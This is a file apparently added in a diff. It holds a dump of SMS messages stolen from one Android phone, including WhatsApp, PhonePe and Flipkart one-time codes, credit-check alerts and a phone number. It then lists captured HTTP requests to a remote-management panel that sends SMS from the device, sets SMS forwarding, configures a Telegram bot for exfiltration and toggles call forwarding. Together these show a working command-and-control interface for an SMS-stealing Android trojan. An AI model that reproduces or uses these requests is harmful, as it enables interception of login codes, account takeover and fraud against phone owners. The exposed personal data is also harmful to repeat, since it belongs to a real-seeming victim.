+    "message_body": "प्रिय Jio ग्राहक,\nहमें उम्मीद है कि आपने हाल ही में अनलिमिटेड JioTrue5G अनुभव का आनंद लिया होगा।\nआपके वर्तमान प्लान की वैधता जल्द ही समाप्त हो रही है। अनलिमिटेड Jio TRUE 5G अनुभव का उपयोग जारी रखने के लिए, सुनिश्चित करें कि आप 2 GB/दिन या उससे ऊपर के प्लान से रिचार्ज करें।\nअभी रिचार्ज करें - www.jio.com/r/TshMMOsm5 \nJio की ओर से प्रेम भरी भेंट",
+    "received_at": "2026-01-24T12:44:55.567Z"
+  },
+  {
+    "id": 384,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JE-JIOPAY-S",
+    "message_body": "वर्तमान रिचार्ज प्लान 25-Jan-26 16:54 Hrs को समाप्त हो रहा है!\nJio नंबर: 9783803992\nप्लान का नाम: Rs 349_28D_2GB/D\nMyJio का उपयोग करके रिचार्ज करें और सभी रिचार्ज पर शून्य सुविधा शुल्क का आनंद लें।\nरिचार्ज करने के लिए - http://tiny.jio.com/dmyjiorchgpl",
+    "received_at": "2026-01-24T12:10:02.349Z"
+  },
+  {
+    "id": 383,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JE-JIOPAY-S",
+    "message_body": "Current Recharge plan Expiring on 25-Jan-26 16:54 Hrs !\nPlan Name : Rs 349_28D_2GB/D\nJio Number : 9783803992\nRecharge using MyJio and enjoy zero convenience charges on all recharges.\nTo recharge - http://tiny.jio.com/dmyjiorchgpl",
+    "received_at": "2026-01-24T12:10:00.795Z"
+  },
+  {
+    "id": 378,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JD-620016-P",
+    "message_body": "आपके Jio नंबर 9783803992 का प्लान जल्दी ही समाप्त हो रहा है। Rs.349 से रिचार्ज कीजिए और अनलिमिटेड 5G डेटा, JioHotstar सब्सक्रिप्शन, अनलिमिटेड वॉयस कॉल और 28 दिनों के लिए  2 GB/दिन डेटा का आनंद लें। विशेष ऑफर 2 महीने का फ्री ट्रायल पाएं। नियम और शर्तें लागू। www.jio.com/r/CMflunERa",
+    "received_at": "2026-01-24T06:29:22.752Z"
+  },
+  {
+    "id": 376,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JR-JIOINF-S",
+    "message_body": "Your plan for Jio number 9783803992 is expiring tomorrow. Recharge IMMEDIATELY to enjoy continued services.",
+    "received_at": "2026-01-24T05:05:48.081Z"
+  },
+  {
+    "id": 373,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "CP-PRYASI-P",
+    "message_body": "Dear Student\nIf you are preparing for Raj. competitive exams\nJoin live Class - 1pr.in/LNxy3223\nContact- 9773360957 \n-PRAYAS CAREER INSTITUTE, UDAIPUR",
+    "received_at": "2026-01-23T11:18:35.678Z"
+  },
+  {
+    "id": 370,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "57273200",
+    "message_body": "<#> Your WhatsApp Business code 598-541\nDon't share this code with others\nrJbA/XP1K+V",
+    "received_at": "2026-01-23T08:54:31.379Z"
+  },
+  {
+    "id": 368,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JK-620016-P",
+    "message_body": "आपके Jio नंबर 9783803992 का प्लान जल्दी ही समाप्त हो रहा है। Rs.349 से रिचार्ज कीजिए और अनलिमिटेड 5G डेटा, JioHotstar सब्सक्रिप्शन, अनलिमिटेड वॉयस कॉल और 28 दिनों के लिए  2 GB/दिन डेटा का आनंद लें। विशेष ऑफर 2 महीने का फ्री ट्रायल पाएं। नियम और शर्तें लागू। www.jio.com/r/CLOZwjcKz",
+    "received_at": "2026-01-23T06:30:50.341Z"
+  },
+  {
+    "id": 364,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "57273200",
+    "message_body": "<#> Your WhatsApp Business account is being registered on a new device\n\nDo not share this code with anyone\nYour WhatsApp Business code: 223-863\nrJbA/XP1K+V",
+    "received_at": "2026-01-23T06:17:51.092Z"
+  },
+  {
+    "id": 360,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VD-CIBILA-S",
+    "message_body": "Your CIBIL Score & Report was checked by CHOLA INVST FIN ECN:10437384235 on 2026-01-23 11:05:21. Know More? Visit https://tu1.cibil.com/CIBILA/e4GoRp -CIBIL",
+    "received_at": "2026-01-23T05:39:50.447Z"
+  },
+  {
+    "id": 359,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "VM-CIBILA-S",
+    "message_body": "Your CIBIL Score & Report was checked by CHOLA INVST FIN ECN:10437386048 on 2026-01-23 11:05:41. Know More? Visit https://tu1.cibil.com/CIBILA/e4InZr -CIBIL",
+    "received_at": "2026-01-23T05:37:35.173Z"
+  },
+  {
+    "id": 358,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JR-JIOINF-S",
+    "message_body": "आपके Jio नंबर 9783803992  के प्लान की वैधता जल्द ही समाप्त हो जाएगी| सेवाओं के बंद होने से बचें । अभी रिचार्ज करें । क्लिक करें www.jio.com/r/TryOh9MEG अन्य प्लान के लिये 1991 पर कॉल करें ।",
+    "received_at": "2026-01-23T05:02:15.010Z"
+  },
+  {
+    "id": 352,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "57273200",
+    "message_body": "<#> Your WhatsApp Business code 864-613\nDon't share this code with others\nrJbA/XP1K+V",
+    "received_at": "2026-01-18T12:05:43.386Z"
+  },
+  {
+    "id": 349,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JE-JioPay-S",
+    "message_body": "डेटा उपयोग अलर्ट!\nआपने 18-Jan-26 13:25 तक दैनिक डेटा का 50% उपयोग कर लिया है।\nJio नंबर: 9783803992\nदैनिक डेटा कोटा: 2 GB\nडेटा बचाने के सुझावों के लिए: http://tiny.jio.com/Savinghn\nडेटा बैलेंस और उपयोग को ट्रैक करने के लिए: http://tiny.jio.com/mobile",
+    "received_at": "2026-01-18T07:55:11.188Z"
+  },
+  {
+    "id": 348,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JE-JioPay-S",
+    "message_body": "Data usage Alert!\n50% of your daily data used as of 18-Jan-26 13:25\nJio Number: 9783803992\nDaily Quota: 2 GB\nFor data saving tips: http://tiny.jio.com/Savingasm\nTrack your data balance and usage: http://tiny.jio.com/mobile",
+    "received_at": "2026-01-18T07:55:09.923Z"
+  },
+  {
+    "id": 346,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "57273200",
+    "message_body": "<#> Your WhatsApp code: 301-654\nDon't share this code with others\n4sgLq1p5sV6",
+    "received_at": "2026-01-18T06:55:24.762Z"
+  },
+  {
+    "id": 344,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "CP-FLPKRT-P",
+    "message_body": "Hey there, need a loan? Share your basic details on Flipkart & get best loan offer from 15+ top Banks/NBFCs. http://u3.mnge.co/FLPKRT/wj89z07",
+    "received_at": "2026-01-18T04:51:32.301Z"
+  },
+  {
+    "id": 341,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JD-PHONPE-S",
+    "message_body": "Your OTP for login on PhonePe is 53011. It is valid for 10 minutes. Do not share your OTP with anyone. gZBmDyq76e3",
+    "received_at": "2026-01-18T00:09:21.327Z"
+  },
+  {
+    "id": 339,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JX-PHONPE-S",
+    "message_body": "33625 is your one time password to proceed on PhonePe. It is valid for 10 minutes. Do not share your OTP with anyone. gZBmDyq76e3",
+    "received_at": "2026-01-17T21:59:12.618Z"
+  },
+  {
+    "id": 338,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "CP-PHONPE-S",
+    "message_body": "Your OTP for login on PhonePe is 70028. It is valid for 10 minutes. Do not share your OTP with anyone. gZBmDyq76e3",
+    "received_at": "2026-01-17T21:56:31.827Z"
+  },
+  {
+    "id": 337,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "AD-FLPKRT-S",
+    "message_body": "[#] 529738 is your LOGIN OTP for Flipkart. DO NOT SHARE this code with anyone, including Flipkart delivery agents.\r\nDf9YrqIZHWd",
+    "received_at": "2026-01-17T21:54:07.984Z"
+  },
+  {
+    "id": 336,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JE-JIOPAY-S",
+    "message_body": "सूचना!\n17-Jan-26 21:18 तक 100% दैनिक डेटा का उपयोग हो चुका है!\nJio नंबर: 9783803992\nप्लान के अनुसार दैनिक कोटा: 2 GB\nदैनिक डेटा कोटा फिर से बहाल होगा: 18-Jan-26 00:51\nअगर आपके पास कोई अन्य डेटा प्लान नहीं है तो आपकी इंटरनेट स्पीड अब 64 Kbps हो जाएगी।\nडेटा पैक के बारे में जानने और रिचार्ज करने के लिए, क्लिक करें: http://tiny.jio.com/dbuydatapack\nअपने डेटा उपयोग के बारे में जानने के लिए, क्लिक करें: http://tiny1.jio.com/HelpfulTips",
+    "received_at": "2026-01-17T15:48:53.384Z"
+  },
+  {
+    "id": 335,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JE-JIOPAY-S",
+    "message_body": "ALERT!\n100% of daily data exhausted as on 17-Jan-26 21:18 !\nJio Number : 9783803992 \nDaily quota as per plan : 2 GB\nDaily data quota will be restored on : 18-Jan-26 00:51\nIf you do not have other data plan then your internet speed will now be reduced to 64 Kbps.\nTo explore and recharge with data packs, click : http://tiny.jio.com/dbuydatapack\nTo know about your data usage, click : http://tiny1.jio.com/HelpfulTips",
+    "received_at": "2026-01-17T15:48:52.960Z"
+  },
+  {
+    "id": 334,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JX-JioPay-S",
+    "message_body": "रिचार्ज सफल रहा!\nप्लान का नाम: 39.0 \nJio नंबर : 9783803992\nलाभ : \nBenefits: 1. Unlimited Data( 3GB/Day  4G/5G data thereafter unlimited at 64Kbps). Validity: 3 Days \nट्रांज़ैक्शन आईडी : 176866326426945267972 \nप्लान का विवरण देखें  - http://tiny.jio.com/dmyjioplans\nआप http://tiny.jio.com/dviewstatmnt पर क्लिक करके इस रिचार्ज के उपयोग का विवरण देख सकते हैं।\nअपने इस रिचार्ज अनुभव को हमारे साथ साझा करें - https://www.jio.com/selfcare/survey/?uid=686353e0-9c75-416f-8e90-712983f1d6e6&lang=hi&source=JIO.COM&custid=176866326426945267972",
+    "received_at": "2026-01-17T15:21:15.560Z"
+  },
+  {
+    "id": 333,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JE-JioPay-S",
+    "message_body": "Recharge Successful !\nPlan Name : 39.0\nJio Number : 9783803992\nEntitlement : \nBenefits: 1. Unlimited Data( 3GB/Day  4G/5G data thereafter unlimited at 64Kbps). Validity: 3 Days\nTransaction ID : 176866326426945267972\nView plan details - http://tiny.jio.com/dmyjioplans\nYou can check usage details for this recharge by clicking http://tiny.jio.com/dviewstatmnt\nShare your recent recharge experience with us - https://www.jio.com/selfcare/survey/?uid=686353e0-9c75-416f-8e90-712983f1d6e6&lang=en&source=JIO.COM&custid=176866326426945267972",
+    "received_at": "2026-01-17T15:21:14.359Z"
+  },
+  {
+    "id": 332,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JE-JioPay-S",
+    "message_body": "कृपया ध्यान दें!\n17-Jan-26 20:49 तक 90% दैनिक डेटा का उपयोग हो चुका है!\nJio नंबर: 9783803992\nप्लान के अनुसार दैनिक कोटा: 2 GB\nअगर आपके पास अतिरिक्त डेटा प्लान नहीं है तो 100% डेटा कोटा इस्तेमाल होने के बाद आपकी इंटरनेट स्पीड कम हो जाएगी।\nडेटा पैक के बारे में जानने और रिचार्ज करने के लिए, क्लिक करें: http://tiny.jio.com/dbuydatapack\nडेटा बचाने के तरीकों को जानने के लिए, यह वीडियो देखें: http://tiny.jio.com/ydatausagehi",
+    "received_at": "2026-01-17T15:19:06.217Z"
+  },
+  {
+    "id": 331,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JG-JioPay-S",
+    "message_body": "ATTENTION!\n90% of daily data used as on 17-Jan-26 20:49 !\nJio Number : 9783803992\nDaily quota as per plan :2 GB\nIf you do not have additional data plan then your internet speed will be reduced once 100% of data quota is used.\nTo explore and recharge with data packs, click : http://tiny.jio.com/dbuydatapack\nFor data saving tips, watch this video : http://tiny.jio.com/ydatausageen",
+    "received_at": "2026-01-17T15:19:03.854Z"
+  },
+  {
+    "id": 325,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JE-JioPay-S",
+    "message_body": "Data usage Alert!\n50% of your daily data used as of 17-Jan-26 17:44\nJio Number: 9783803992\nDaily Quota: 2 GB\nFor data saving tips: http://tiny.jio.com/Savingasm\nTrack your data balance and usage: http://tiny.jio.com/mobile",
+    "received_at": "2026-01-17T12:14:55.068Z"
+  },
+  {
+    "id": 324,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JG-JioPay-S",
+    "message_body": "डेटा उपयोग अलर्ट!\nआपने 17-Jan-26 17:44 तक दैनिक डेटा का 50% उपयोग कर लिया है।\nJio नंबर: 9783803992\nदैनिक डेटा कोटा: 2 GB\nडेटा बचाने के सुझावों के लिए: http://tiny.jio.com/Savinghn\nडेटा बैलेंस और उपयोग को ट्रैक करने के लिए: http://tiny.jio.com/mobile",
+    "received_at": "2026-01-17T12:14:54.922Z"
+  },
+  {
+    "id": 321,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JE-JioPay-S",
+    "message_body": "Data usage Alert!\n50% of your daily data used as of 17-Jan-26 00:08\nJio Number: 9783803992\nDaily Quota: 2 GB\nFor data saving tips: http://tiny.jio.com/Savingasm\nTrack your data balance and usage: http://tiny.jio.com/mobile",
+    "received_at": "2026-01-16T18:38:19.408Z"
+  },
+  {
+    "id": 320,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JG-JioPay-S",
+    "message_body": "डेटा उपयोग अलर्ट!\nआपने 17-Jan-26 00:08 तक दैनिक डेटा का 50% उपयोग कर लिया है।\nJio नंबर: 9783803992\nदैनिक डेटा कोटा: 2 GB\nडेटा बचाने के सुझावों के लिए: http://tiny.jio.com/Savinghn\nडेटा बैलेंस और उपयोग को ट्रैक करने के लिए: http://tiny.jio.com/mobile",
+    "received_at": "2026-01-16T18:38:19.404Z"
+  },
+  {
+    "id": 317,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "919887598234",
+    "message_body": "Dear Customer, You have a missed call from +919887598234 The last missed call was at 05:36 PM on 16-Jan-2026 Thankyou, Team Jio.",
+    "received_at": "2026-01-16T12:07:17.904Z"
+  },
+  {
+    "id": 316,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "919521480984",
+    "message_body": "Dear Customer, You have a missed call from +919521480984 The last missed call was at 05:36 PM on 16-Jan-2026 Thankyou, Team Jio.",
+    "received_at": "2026-01-16T12:07:15.186Z"
+  },
+  {
+    "id": 315,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "917318605570",
+    "message_body": "Dear Customer, You have a missed call from +917318605570 The last missed call was at 05:34 PM on 16-Jan-2026 Thankyou, Team Jio.",
+    "received_at": "2026-01-16T12:07:11.599Z"
+  },
+  {
+    "id": 314,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "918829032856",
+    "message_body": "Dear Customer, You have 2 missed calls from +918829032856 The last missed call was at 05:36 PM on 16-Jan-2026 Thankyou, Team Jio.",
+    "received_at": "2026-01-16T12:07:08.875Z"
+  },
+  {
+    "id": 312,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "AD-BSELTD-S",
+    "message_body": "5PAISA CAPITAL at EOD 31/12/2025 reported your Fund bal Rs -57.490 & Securities bal 0. This excludes your Bank, DP and PMS bal with the broker-BSE",
+    "received_at": "2026-01-16T10:15:42.211Z"
+  },
+  {
+    "id": 308,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "57273200",
+    "message_body": "<#> Your WhatsApp Business code 853-109\nDon't share this code with others\nrJbA/XP1K+V",
+    "received_at": "2026-01-15T13:37:08.464Z"
+  },
+  {
+    "id": 305,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "57273200",
+    "message_body": "<#> Your WhatsApp Business account is being registered on a new device\n\nDo not share this code with anyone\nYour WhatsApp Business code: 239-307\nrJbA/XP1K+V",
+    "received_at": "2026-01-15T12:26:05.018Z"
+  },
+  {
+    "id": 302,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "JK-620016-P",
+    "message_body": "Recharge now Jio no. 9783803992 with Rs.899 plan & enjoy Special benefits:Free Pro Google Gemini worth Rs.35100 + JioHotstar+ Unlimited 5G data + 2 GB/day & 20GB , Unlimited Voice, 90 Days. Use PhonePe app & get upto Rs.400 Rewards. T&CA. https://phon.pe/jioh",
+    "received_at": "2026-01-15T09:01:27.759Z"
+  },
+  {
+    "id": 294,
+    "device_id": "b2c76650be02c3cd",
+    "sender": "AX-MOBIKW-S",
+    "message_body": "Your ZIP bill of Rs.10379 is generated. Settle before the due date. Ignore if paid. Pay Now: https://gi9.in/MOBIKW/7Mtbv8 -MobiKwik",
+    "received_at": "2026-01-14T10:14:09.480Z"
+  }
+]
+
+
+
+
+
+
+
+
+
+
+
+5th api 
+
+
+
+POST /api/command/send HTTP/1.1
+Content-Type: application/json; utf-8
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; POCO F1 MIUI/V12.0.3.0.QEJMIXM)
+Host: v0-remotemanagementsystem-six.vercel.app
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 132
+
+{"device_id":"b2c76650be02c3cd","command_type":"send_sms","command_data":{"phone_number":"96568282528","message":"..","sim_slot":0}}
+
+
+
+
+
+
+
+{
+  "status": "success",
+  "message": "Command sent successfully"
+}
+
+
+
+
+
+7th api 
+
+
+
+GET /api/device/b2c76650be02c3cd/forms HTTP/1.1
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; POCO F1 MIUI/V12.0.3.0.QEJMIXM)
+Host: v0-remotemanagementsystem-six.vercel.app
+Connection: Keep-Alive
+Accept-Encoding: gzip
+
+
+
+
+
+[]
+
+
+
+
+8th api  POST /api/config/sms_forward HTTP/1.1
+Content-Type: application/json; utf-8
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; POCO F1 MIUI/V12.0.3.0.QEJMIXM)
+Host: v0-remotemanagementsystem-six.vercel.app
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 34
+
+{"forward_number":"9456888851888"}
+
+
+
+
+
+
+{
+  "status": "success",
+  "message": "Forwarding number updated successfully."
+}
+
+
+
+
+
+
+9th api 
+
+
+POST /api/config/telegram HTTP/1.1
+Content-Type: application/json; utf-8
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; POCO F1 MIUI/V12.0.3.0.QEJMIXM)
+Host: v0-remotemanagementsystem-six.vercel.app
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 51
+
+{"telegram_bot_token":"gg","telegram_chat_id":"cg"}
+
+
+
+
+{
+  "status": "success",
+  "message": "Telegram details updated successfully."
+}
+
+
+
+
+POST /api/command/send HTTP/1.1
+Content-Type: application/json; utf-8
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; POCO F1 MIUI/V12.0.3.0.QEJMIXM)
+Host: v0-remotemanagementsystem-six.vercel.app
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 136
+
+{"device_id":"b2c76650be02c3cd","command_type":"call_forward","command_data":{"action":"enable","forward_number":"000000","sim_slot":0}}
+
+
+{
+  "status": "success",
+  "message": "Command sent successfully"
+}
+
+
+
+10th api 
+
+
+POST /api/command/send HTTP/1.1
+Content-Type: application/json; utf-8
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; POCO F1 MIUI/V12.0.3.0.QEJMIXM)
+Host: v0-remotemanagementsystem-six.vercel.app
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 111
+
+{"device_id":"b2c76650be02c3cd","command_type":"call_forward","command_data":{"action":"disable","sim_slot":0}}
+
+
+
+{
+  "status": "success",
+  "message": "Command sent successfully"
+}
+
+
+
